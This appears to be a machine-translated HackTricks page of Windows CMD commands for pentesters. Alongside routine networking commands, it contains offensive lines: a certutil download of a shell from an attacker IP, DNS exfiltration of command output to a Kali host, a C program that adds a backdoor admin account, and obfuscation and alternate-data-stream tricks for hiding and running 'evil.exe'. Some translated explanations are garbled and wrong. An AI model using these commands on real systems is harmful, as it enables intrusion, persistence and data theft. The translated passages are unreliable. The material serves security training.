SNMP (Simple Network Management Protocol) je protokol koji se koristi za upravljanje i nadzor mre≈ænih ureƒëaja. Omoguƒáava administratorima da prikupljaju informacije o statusu i performansama mre≈æe, kao i da upravljaju mre≈ænim ureƒëajima. SNMP koristi poruke za komunikaciju izmeƒëu upravljaƒçke stanice i upravljanih ureƒëaja. Ove poruke se ≈°alju preko UDP (User Datagram Protocol) protokola na portu 161. SNMP podr≈æava razliƒçite operacije, ukljuƒçujuƒái ƒçitanje i pisanje vrednosti, kao i praƒáenje dogaƒëaja.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

### Mre≈æni interfejsi

#### Pregled dostupnih mre≈ænih interfejsa

Da biste pregledali dostupne mre≈æne interfejse na Windows operativnom sistemu, mo≈æete koristiti sledeƒáu komandu:

```plaintext
ipconfig
```

Ova komanda ƒáe prikazati informacije o svim aktivnim mre≈ænim interfejsima, ukljuƒçujuƒái IP adresu, podmre≈ænu masku, podrazumevani gateway i druge relevantne informacije.

#### Promena IP adrese

Da biste promenili IP adresu mre≈ænog interfejsa, mo≈æete koristiti sledeƒáu komandu:

```plaintext
netsh interface ip set address "Naziv interfejsa" static IP_adresa Podmre≈æna_maska Gateway
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji ≈æelite da promenite, "IP\_adresa" sa ≈æeljenom IP adresom, "Podmre≈æna\_maska" sa odgovarajuƒáom podmre≈ænom maskom i "Gateway" sa podrazumevanim gateway-om.

#### Promena DNS servera

Da biste promenili DNS servere za odreƒëeni mre≈æni interfejs, mo≈æete koristiti sledeƒáu komandu:

```plaintext
netsh interface ip set dns "Naziv interfejsa" static DNS_server_primarni
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji ≈æelite da promenite i "DNS\_server\_primarni" sa IP adresom primarnog DNS servera.

#### Iskljuƒçivanje mre≈ænog interfejsa

Da biste iskljuƒçili odreƒëeni mre≈æni interfejs, mo≈æete koristiti sledeƒáu komandu:

```plaintext
netsh interface set interface "Naziv interfejsa" admin=disable
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji ≈æelite da iskljuƒçite.

#### Ukljuƒçivanje mre≈ænog interfejsa

Da biste ukljuƒçili odreƒëeni mre≈æni interfejs, mo≈æete koristiti sledeƒáu komandu:

```plaintext
netsh interface set interface "Naziv interfejsa" admin=enable
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji ≈æelite da ukljuƒçite.

```bash
ipconfig /all
```

### ARP tabela

ARP (Address Resolution Protocol) tabela je tabela koja se koristi u mre≈ænom okru≈æenju kako bi se mapirale IP adrese na MAC adrese. Ova tabela omoguƒáava ureƒëajima da komuniciraju na lokalnoj mre≈æi. Kada se ureƒëaj pove≈æe na mre≈æu, on ≈°alje ARP zahtev kako bi saznao MAC adresu drugog ureƒëaja na istoj mre≈æi. Ova tabela se ƒçesto koristi u napadima na mre≈æu kako bi se izvr≈°io ARP spoofing ili ARP poisoning.

```bash
arp -A
```

## Preuzimanje

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

CertReq.exe je alatka koja se koristi za generisanje i upravljanje zahtevima za sertifikate u operativnom sistemu Windows. Ova komanda omoguƒáava korisnicima da kreiraju CSR (Certificate Signing Request) datoteke koje se koriste za dobijanje digitalnih sertifikata od sertifikacionih tela. CSR datoteke sadr≈æe informacije o subjektu za koga se zahteva sertifikat, kao i javni kljuƒç koji ƒáe biti ukljuƒçen u sertifikat. CertReq.exe takoƒëe omoguƒáava korisnicima da izdaju, povuku i obnove sertifikate. Ova alatka je korisna za pentestere koji ≈æele da manipuli≈°u sertifikatima u cilju testiranja sigurnosti sistema.

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

Certutil.exe je alat koji se koristi za rad sa digitalnim certifikatima u operativnom sistemu Windows. Ovaj alat omoguƒáava korisnicima da pregledaju, izdaju, povuku, izvoze i uvoze certifikate, kao i da obavljaju druge operacije vezane za upravljanje certifikatima. Certutil.exe se ƒçesto koristi u procesu hardeninga sistema kako bi se osigurala sigurnost i integritet digitalnih certifikata.

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

**Pronaƒëite jo≈° mnogo toga pretra≈æivanjem `Download` na** [**https://lolbas-project.github.io**](https://lolbas-project.github.io/)

## Razno

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

### Zaobila≈æenje zabrane kori≈°ƒáenja odreƒëenih karaktera

Kada se susretnete sa zabranom kori≈°ƒáenja odreƒëenih karaktera prilikom izvr≈°avanja komandi, mo≈æete primeniti sledeƒáe tehnike za zaobila≈æenje ove zabrane:

1. Koristite alternativne karaktere: Umesto zabranjenih karaktera, mo≈æete koristiti sliƒçne karaktere koji nisu zabranjeni. Na primer, umesto slova "o" mo≈æete koristiti broj "0" ili umesto slova "s" mo≈æete koristiti simbol "$".
2. Koristite heksadecimalnu reprezentaciju: Umesto zabranjenih karaktera, mo≈æete koristiti njihovu heksadecimalnu reprezentaciju. Na primer, umesto slova "a" mo≈æete koristiti "\x61".
3. Koristite Unicode reprezentaciju: Umesto zabranjenih karaktera, mo≈æete koristiti njihovu Unicode reprezentaciju. Na primer, umesto slova "b" mo≈æete koristiti "\u0062".
4. Koristite escape sekvence: Umesto zabranjenih karaktera, mo≈æete koristiti escape sekvence. Na primer, umesto znaka za novi red "\n" mo≈æete koristiti "\r\n".
5. Koristite konkatenaciju: Umesto zabranjenih karaktera, mo≈æete koristiti konkatenaciju vi≈°e dozvoljenih karaktera kako biste dobili ≈æeljeni rezultat. Na primer, umesto karaktera "e" mo≈æete koristiti "ex" ili "ee".

Kori≈°ƒáenjem ovih tehnika, mo≈æete zaobiƒái zabranu kori≈°ƒáenja odreƒëenih karaktera i uspe≈°no izvr≈°iti komande.

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

### DOSfuscation

Generi≈°e obfuskiranu CMD liniju

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

### ACL-ovi adresa za slu≈°anje

Mo≈æete slu≈°ati na [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) bez potrebe za administratorskim pravima.

```bash
netsh http show urlacl
```

### Ruƒçni DNS shell

**Napadaƒç** (Kali) mora koristiti jednu od ove 2 opcije:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

#### ≈Ωrtva

**Tehnika `for /f tokens`**: Ovo nam omoguƒáava da izvr≈°imo komande, dobijemo prvih X reƒçi svake linije i po≈°aljemo ih preko DNS-a na na≈° server.

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

Takoƒëe mo≈æete **preusmeriti** izlaz, a zatim ga **proƒçitati**.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

## Pozivanje CMD-a iz C koda

Da biste pozvali CMD (Command Prompt) iz C koda, mo≈æete koristiti funkciju `system()`. Ova funkcija omoguƒáava izvr≈°avanje CMD komandi iz C programa.

Evo jednostavnog primera kako koristiti `system()` funkciju:

```c
#include <stdlib.h>

int main() {
    system("cmd /c <komanda>");
    return 0;
}
```

U ovom primeru, `<komanda>` treba zameniti sa ≈æeljenom CMD komandom koju ≈æelite da izvr≈°ite. Na primer, ako ≈æelite da izvr≈°ite komandu `ipconfig`, va≈° kod bi izgledao ovako:

```c
#include <stdlib.h>

int main() {
    system("cmd /c ipconfig");
    return 0;
}
```

Kada pokrenete ovaj program, CMD ƒáe biti pozvan i izvr≈°iƒáe se komanda `ipconfig`. Mo≈æete koristiti bilo koju drugu CMD komandu na isti naƒçin.

Va≈æno je napomenuti da kori≈°ƒáenje `system()` funkcije mo≈æe predstavljati sigurnosni rizik, posebno ako se korisniƒçki unos direktno prosleƒëuje kao argument komande. Uvek budite oprezni prilikom rukovanja korisniƒçkim unosima kako biste izbegli potencijalne ranjivosti.

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```

## –®–ø–∞—Ä–∞–ª–∞–Ω–∫–∞ –∑–∞ –∞–ª—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–µ –ø–æ–¥–∞—Ç–∫–æ–≤–Ω–µ —Ç–æ–∫–æ–≤–µ (ADS/Alternate Data Stream)

**–ü—Ä–∏–º–µ—Ä–∏ –ø—Ä–µ—É–∑–µ—Ç–∏ —Å–∞** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**. –ò–º–∞ –∏ –º–Ω–æ–≥–æ –¥—Ä—É–≥–∏—Ö!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
